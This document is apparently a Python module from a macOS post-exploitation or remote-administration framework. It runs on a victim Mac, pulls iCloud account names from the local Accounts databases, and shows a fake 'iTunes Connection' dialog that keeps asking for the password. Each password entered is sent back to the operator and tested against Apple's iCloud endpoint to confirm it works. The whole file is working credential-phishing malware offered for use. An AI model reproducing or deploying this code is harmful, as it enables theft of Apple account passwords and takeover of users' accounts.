class Module:
    def __init__(self):
        self.info = {
            "Author": ["Marten4n6"],
            "Description": "Attempts to phish the user for their iCloud password via iTunes.",
            "References": [],
            "Task": True
        }
        self.list_accounts = False
        self.itunes_email = None

    def setup(self, module_view, output_view, successful):
        module_view.add("The next prompt will ask you for an iTunes account (email).", "info")
        list_accounts = module_view.prompt("Would you like to list available iTunes accounts (recommended)? [Y/n]").lower()

        if not list_accounts or list_accounts == "y":
            self.info["Task"] = False
            self.list_accounts = True

            successful.put(True)
        else:
            # Don't list accounts, show phishing prompt.
            self.info["Task"] = True
            self.list_accounts = False

            self.itunes_email = module_view.prompt("iTunes account (email) to phish: ")

            if not self.itunes_email or "@" not in self.itunes_email:
                output_view.add("Invalid iTunes account (email) entered, cancelled.", "attention")
                successful.put(False)
            else:
                output_view.add("Started phishing task for '%s'." % self.itunes_email, "info")
                successful.put(True)

    def run(self):
        return """\
        list_accounts = {0}
        
        if list_accounts:
            import sqlite3
        
            paths = [
                "~/Library/Accounts/Accounts4.sqlite",
                # Older Mac versions seem to name the accounts database "Accounts3" instead.
                "~/Library/Accounts/Accounts3.sqlite"
            ]
            
            for path in paths:
                if not os.path.exists(os.path.expanduser(path)):
                    continue
                
                database = sqlite3.connect(os.path.expanduser(path))
                
                try:
                    result = list(database.execute("SELECT ZUSERNAME FROM ZACCOUNT WHERE ZACCOUNTDESCRIPTION='iCloud'"))
    
                    send_response("Received account: %s" % result[0][0])
                except Exception as ex:
                    if str(ex) == "list index out of range":
                        send_response("No iCloud accounts present.", "attention")
                    else:
                        send_response("Unexpected error: " + str(ex), "attention")
                        
                database.close()
                
            send_response("Finished getting accounts, you can now run \\"use phish_itunes\\" again.", "info")
        else:
            import getpass
            import pwd
            
            itunes_email = "{1}"
        
            try:
                while True:
                    user_uid = pwd.getpwnam(getpass.getuser()).pw_uid
                    osa = "launchctl asuser " + str(user_uid) + " osascript -e 'tell application \\"iTunes\\"' -e \\"pause\\" -e \\"end tell\\"; osascript -e 'tell app \\"iTunes\\" to activate' -e 'tell app \\"iTunes\\" to activate' -e 'tell app \\"iTunes\\" to display dialog \\"Error connecting to iTunes. Please verify your password for " + itunes_email + " \\" giving up after (300) default answer \\"\\" with icon 1 with hidden answer with title \\"iTunes Connection\\"'"
                    response = run_command(osa, False, False)
                    
                    if "User canceled" in response:
                        send_response("User has attempted to cancel, trying again...")
                    elif "returned:" in response:
                        password = response.replace(response.split("text returned:")[0], "") \\
                                           .replace("text returned:", "", 1).split(", gave up")[0]
                            
                        send_response("User attempted to use the password: '%s'" % password)
                        send_response("Attempting to verify password with iCloud...")
                        
                        # Verify the correct password was entered.
                        try:
                            request = urllib2.Request("https://setup.icloud.com/setup/get_account_settings")
                            base64string = base64.encodestring("%s:%s" % (itunes_email, password)).replace("\\n", "")
                            
                            request.add_header("Authorization", "Basic %s" % base64string)   

                            result = urllib2.urlopen(request).read()
                        except Exception as ex:    
                            if str(ex).startswith("HTTP Error 401"):
                                send_response("Bad combination for: '%s'" % password)
                                continue
                            elif str(ex).startswith("HTTP Error 409"):
                                send_response("Valid combination (2FA enabled!): '%s'")
                                break
                            else:
                                send_response("Unexpected error: %s" % str(ex))
                                continue
                        
                        # An exception didn't occur so the password must be right.
                        send_response("Valid combination: '%s'" % password) 
                        break
                    else:
                        send_response("Unexpected response: " + response)
            except SystemExit:
                # Kill task called, stop phishing.
                send_response("Phishing stopped.")
        """.format(self.list_accounts, self.itunes_email)
